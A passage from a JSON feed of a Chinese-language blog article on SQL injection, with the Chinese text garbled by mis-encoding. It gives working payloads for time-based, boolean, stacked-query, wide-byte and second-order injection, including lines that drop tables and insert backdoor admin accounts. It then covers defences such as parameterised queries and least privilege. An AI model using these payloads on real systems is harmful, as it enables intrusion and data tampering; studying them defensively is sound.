<span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>ç›²æ³¨è‡ªåŠ¨åŒ–æŠ€å·§</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># é€ä½åˆ¤æ–­æ•°æ®åº“å<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">122</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰\"><a href=\"#4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰\" class=\"headerlink\" title=\"4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰\"></a>4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ„é€ å¸ƒå°”è¡¨è¾¾å¼ï¼Œæ ¹æ®é¡µé¢è¿”å›å†…å®¹çš„å·®å¼‚æ¥æ¨æµ‹æ•°æ®åº“ä¿¡æ¯ã€‚å½“æ¡ä»¶ä¸ºçœŸæ—¶é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œæ¡ä»¶ä¸ºå‡æ—¶é¡µé¢å¼‚å¸¸æˆ–å†…å®¹å‘ç”Ÿå˜åŒ–ã€‚</p>\n<p><strong>æ ¸å¿ƒå‡½æ•°ä¸æŠ€å·§</strong>ï¼š</p>\n<ul>\n<li><code>substr(str, pos, len)</code> - å­—ç¬¦ä¸²æˆªå–</li>\n<li><code>ascii(char)</code> - å­—ç¬¦è½¬ASCIIç </li>\n<li><code>length(str)</code> - å­—ç¬¦ä¸²é•¿åº¦</li>\n<li><code>like</code> - æ¨¡ç³ŠåŒ¹é…</li>\n</ul>\n<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># åˆ¤æ–­æ•°æ®åº“åé•¿åº¦<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> length(<span class=\"hljs-keyword\">database</span>())=<span class=\"hljs-number\">8</span> <span class=\"hljs-comment\">--</span><br><br># é€ä½çˆ†ç ´æ•°æ®åº“å<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> <span class=\"hljs-comment\">--  # &#x27;s&#x27;</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span> <span class=\"hljs-comment\">--  # &#x27;e&#x27;</span><br><br># ä½¿ç”¨<span class=\"hljs-keyword\">like</span>è¿›è¡Œæ¨¡ç³ŠåŒ¹é…<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">&#x27;sec%&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰\"><a href=\"#5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰\" class=\"headerlink\" title=\"5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰\"></a>5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šå½“æ•°æ®åº“å’ŒWebåº”ç”¨æ”¯æŒåœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æ‰§è¡Œå¤šæ¡SQLè¯­å¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åˆ†å·<code>;</code>åˆ†éš”å¤šæ¡è¯­å¥ï¼Œå®ç°æ›´å¤æ‚çš„æ”»å‡»æ“ä½œã€‚</p>\n<p><strong>æ”¯æŒæƒ…å†µ</strong>ï¼š</p>\n<ul>\n<li><strong>MySQL</strong>: éœ€è¦ä½¿ç”¨<code>multi_query()</code>å‡½æ•°ï¼Œé»˜è®¤ä¸æ”¯æŒ</li>\n<li><strong>SQL Server</strong>: é»˜è®¤æ”¯æŒ</li>\n<li><strong>PostgreSQL</strong>: æ”¯æŒ</li>\n<li><strong>Oracle</strong>: ä¸æ”¯æŒ</li>\n</ul>\n<p><strong>å±é™©æ“ä½œç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> users(username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;hacker&#x27;</span>,<span class=\"hljs-string\">&#x27;123456&#x27;</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">drop</span> <span class=\"hljs-keyword\">table</span> logs <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">&#x27;hacked&#x27;</span> <span class=\"hljs-keyword\">where</span> id=<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">user</span> hacker identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">&#x27;123456&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>é«˜çº§åˆ©ç”¨</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># åˆ›å»ºæ–°ç®¡ç†å‘˜è´¦æˆ·<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> admin_users(username,<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-keyword\">role</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;backdoor&#x27;</span>,md5(<span class=\"hljs-string\">&#x27;secret&#x27;</span>),<span class=\"hljs-string\">&#x27;admin&#x27;</span>) <span class=\"hljs-comment\">--</span><br><br># ä¿®æ”¹ç°æœ‰ç”¨æˆ·æƒé™<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">role</span>=<span class=\"hljs-string\">&#x27;admin&#x27;</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">&#x27;normaluser&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰\"><a href=\"#6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰\" class=\"headerlink\" title=\"6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰\"></a>6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šåˆ©ç”¨å¤šå­—èŠ‚å­—ç¬¦é›†ï¼ˆå¦‚GBKã€GB2312ï¼‰çš„ç¼–ç ç‰¹æ€§ï¼Œä½¿è½¬ä¹‰å­—ç¬¦<code>\\</code>ä¸æ³¨å…¥å­—ç¬¦ç»„åˆæˆåˆæ³•çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è½¬ä¹‰é˜²æŠ¤æœºåˆ¶ã€‚</p>\n<p><strong>æŠ€æœ¯èƒŒæ™¯</strong>ï¼š</p>\n<ul>\n<li>GBKç¼–ç ä¸­ï¼Œä¸€ä¸ªæ±‰å­—å ç”¨2ä¸ªå­—èŠ‚</li>\n<li>æŸäº›å­—èŠ‚ç»„åˆä¼šè¢«è§£é‡Šä¸ºå•ä¸ªæ±‰å­—å­—ç¬¦</li>\n<li><code>%df%5c</code> åœ¨GBKç¼–ç ä¸‹ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªæ±‰å­—</li>\n</ul>\n<p><strong>ç»•è¿‡åŸç†</strong>ï¼š</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-comment\"># æ­£å¸¸æƒ…å†µï¼šå•å¼•å·è¢«è½¬ä¹‰</span><br>payload: admin<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">è½¬ä¹‰å: admin\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br><br><span class=\"hljs-comment\"># å®½å­—èŠ‚ç»•è¿‡ï¼š</span><br>payload: admin%df<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">è½¬ä¹‰å: admin%df\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br>GBKè§£æ: admin[æ±‰å­—]<span class=\"hljs-string\">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>å®æˆ˜payload</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?username=<span class=\"hljs-keyword\">admin</span>%df<span class=\"hljs-string\">&#x27; union select 1,user(),3 --</span><br><span class=\"hljs-string\">?id=1%df&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,<span class=\"hljs-keyword\">database</span>())) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰\"><a href=\"#7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰\" class=\"headerlink\" title=\"7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰\"></a>7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šæ¶æ„payloadåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­è¢«æ­£å¸¸å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä½†åœ¨åç»­çš„æŸ¥è¯¢ä¸­è¢«è°ƒç”¨æ—¶è§¦å‘SQLæ³¨å…¥ã€‚è¿™ç§æ”»å‡»æ–¹å¼å…·æœ‰å¾ˆå¼ºçš„éšè”½æ€§ã€‚</p>\n<p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€é˜¶æ®µ - æ•°æ®å­˜å‚¨</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-comment\"># ç”¨æˆ·æ³¨å†Œæ—¶æäº¤æ¶æ„ç”¨æˆ·å</span><br>username: admin&#x27;<span class=\"hljs-comment\">--</span><br><span class=\"hljs-comment\"># è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ç¬¬äºŒé˜¶æ®µ - è§¦å‘æ³¨å…¥</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"># ç®¡ç†åå°æŸ¥è¯¢è¯¥ç”¨æˆ·ä¿¡æ¯æ—¶<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> username <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;admin&#x27;</span><span class=\"hljs-comment\">--&#x27;</span><br># æ³¨é‡Šç¬¦å¯¼è‡´åç»­æ¡ä»¶è¢«å¿½ç•¥<br></code></pre></td></tr></table></figure>\n\n<p><strong>å…¸å‹åº”ç”¨åœºæ™¯</strong>ï¼š</p>\n<ul>\n<li>ç”¨æˆ·æ³¨å†Œ&#x2F;ä¸ªäººä¿¡æ¯ä¿®æ”¹</li>\n<li>æ–‡ç« è¯„è®ºç³»ç»Ÿ</li>\n<li>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶åå¤„ç†</li>\n<li>æ—¥å¿—è®°å½•ç³»ç»Ÿ</li>\n</ul>\n<h2 id=\"é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\"><a href=\"#é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ\"></a>é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ</h2><h3 id=\"å¼€å‘å±‚é¢é˜²æŠ¤\"><a href=\"#å¼€å‘å±‚é¢é˜²æŠ¤\" class=\"headerlink\" title=\"å¼€å‘å±‚é¢é˜²æŠ¤\"></a>å¼€å‘å±‚é¢é˜²æŠ¤</h3><ol>\n<li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢&#x2F;é¢„ç¼–è¯‘è¯­å¥</strong></li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-regexp\">//</span> é”™è¯¯å†™æ³•<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><br><span class=\"hljs-regexp\">//</span> æ­£ç¡®å†™æ³•  <br><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>-&gt;prepare(<span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class=\"hljs-variable\">$stmt</span>-&gt;execute([<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</strong></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// ç™½åå•éªŒè¯</span><br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/^[0-9]+$/&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// é•¿åº¦é™åˆ¶</span><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &gt; <span class=\"hljs-number\">50</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>ä½¿ç”¨ORMæ¡†æ¶</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># Django ORM - è‡ªåŠ¨å‚æ•°åŒ–<br><span class=\"hljs-keyword\">User</span>.objects.<span class=\"hljs-keyword\">filter</span>(id=user_id)<br><br># SQLAlchemy - å®‰å…¨æŸ¥è¯¢<br><span class=\"hljs-keyword\">session</span>.query(<span class=\"hljs-keyword\">User</span>).<span class=\"hljs-keyword\">filter</span>(<span class=\"hljs-keyword\">User</span>.id == user_id)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ•°æ®åº“å±‚é¢é˜²æŠ¤\"><a href=\"#æ•°æ®åº“å±‚é¢é˜²æŠ¤\" class=\"headerlink\" title=\"æ•°æ®åº“å±‚é¢é˜²æŠ¤\"></a>æ•°æ®åº“å±‚é¢é˜²æŠ¤</h3><ol>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-comment\">-- åˆ›å»ºä¸“ç”¨åº”ç”¨è´¦æˆ·ï¼Œä»…æˆäºˆå¿…è¦æƒé™</span><br><span class=\"hljs-keyword\">CREATE</span> <span class=\"hljs-keyword\">USER</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span> IDENTIFIED <span class=\"hljs-keyword\">BY</span> <span class=\"hljs-string\">&#x27;strong_password&#x27;</span>;<br><span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">SELECT</span>, <span class=\"hljs-keyword\">INSERT</span>, <span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">ON</span> webapp_db.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span>;<br><span class=\"hljs-comment\">-- ç¦æ­¢DROP, ALTER, FILEç­‰å±é™©æƒé™</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>å…³é—­é”™è¯¯ä¿¡æ¯æ˜¾ç¤º</strong></li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">// ç”Ÿäº§ç¯å¢ƒå…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class=\"hljs-built_in\">ini_set</span>(&#x27;display_errors&#x27;, <span class=\"hljs-number\">0</span>);<br><span class=\"hljs-built_in\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>å¯ç”¨SQLæŸ¥è¯¢æ—¥å¿—</strong></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-comment\">-- MySQLå¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—</span><br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> slow_query_log <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;ON&#x27;</span>;<br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> long_query_time <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"WAFä¸ç›‘æ§\"><a href=\"#WAFä¸ç›‘æ§\" class=\"headerlink\" title=\"WAFä¸ç›‘æ§\"></a>WAFä¸ç›‘æ§</h3><ol>\n<li><strong>éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™</strong></li>\n</ol>\n<ul>\n<li>ModSecurityè§„åˆ™é›†</li>\n<li>äº‘WAFæœåŠ¡ï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ç­‰ï¼‰</li>\n<li>è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™</li>\n</ul>\n<ol>\n<li><strong>å®æ—¶ç›‘æ§ä¸å‘Šè­¦</strong></li>\n</ol>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># ç›‘æ§å¼‚å¸¸SQLæŸ¥è¯¢</span><br>tail <span class=\"hljs-punctuation\">-</span>f /var/<span class=\"hljs-built_in\">log</span>/mysql/mysql.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-string\">| grep -i &quot;</span>union\\<span class=\"hljs-string\">|sleep\\|benchmark&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>SQLæ³¨å…¥æ¼æ´è™½ç„¶æ˜¯ä¸€ä¸ªâ€è€â€é—®é¢˜ï¼Œä½†åœ¨å®é™…çš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨è¯„ä¼°ä¸­ä»ç„¶å¤§é‡å­˜åœ¨ã€‚ç†è§£å„ç§æ³¨å…¥ç±»å‹çš„åŸç†å’Œåˆ©ç”¨æ–¹æ³•ï¼Œå¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜å‘ç°æ¼æ´ã€å¼€å‘äººå‘˜ä¿®å¤æ¼æ´éƒ½å…·æœ‰é‡è¦æ„ä¹‰ã€‚</p>\n<p><strong>å…³é”®è¦ç‚¹å›é¡¾</strong>ï¼š</p>\n<ul>\n<li>é”™è¯¯æ³¨å…¥åˆ©ç”¨æ•°æ®åº“æŠ¥é”™è·å–ä¿¡æ¯</li>\n<li>è”åˆæ³¨å…¥é€šè¿‡unionè¯­å¥ç›´æ¥è·å–æ•°æ®</li>\n<li>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨é€‚ç”¨äºæ— å›æ˜¾åœºæ™¯</li>\n<li>å †å æ³¨å…¥å±é™©æ€§æœ€é«˜ï¼Œå¯æ‰§è¡Œä»»æ„SQLæ“ä½œ</li>\n<li>å®½å­—èŠ‚æ³¨å…¥é’ˆå¯¹ç‰¹å®šç¼–ç ç¯å¢ƒ</li>\n<li>äºŒæ¬¡æ³¨å…¥å…·æœ‰è¾ƒå¼ºçš„éšè”½æ€§</li>\n</ul>\n<p><strong>é˜²æŠ¤æ ¸å¿ƒ</strong>ï¼š</p>\n<ul>\n<li>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ˜¯æœ€æœ‰æ•ˆçš„é˜²æŠ¤æ‰‹æ®µ</li>\n<li>è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç åŒæ ·é‡è¦</li>\n<li>éµå¾ªæœ€å°æƒé™åŸåˆ™é…ç½®æ•°æ®åº“æƒé™</li>\n<li>å®šæœŸè¿›è¡Œå®‰å…¨è¯„ä¼°å’Œä»£ç å®¡è®¡</li>\n</ul>\n<p>å¸Œæœ›æœ¬æ–‡èƒ½å¤Ÿå¸®åŠ©è¯»è€…å…¨é¢ç†è§£SQLæ³¨å…¥çš„æ”»é˜²æŠ€æœ¯ï¼Œåœ¨å®é™…å·¥ä½œä¸­æ›´å¥½åœ°ä¿æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚</p>\n<hr>\n<blockquote>\n<p><strong>å…è´£å£°æ˜</strong>ï¼šæœ¬æ–‡å†…å®¹ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•äººä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œè¿æ³•æ´»åŠ¨ï¼Œåæœè‡ªè´Ÿã€‚</p>\n</blockquote>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "Webå®‰å…¨",
                "SQLæ³¨å…¥",
                "ç½‘ç»œå®‰å…¨"
            ]
        }
    ]
}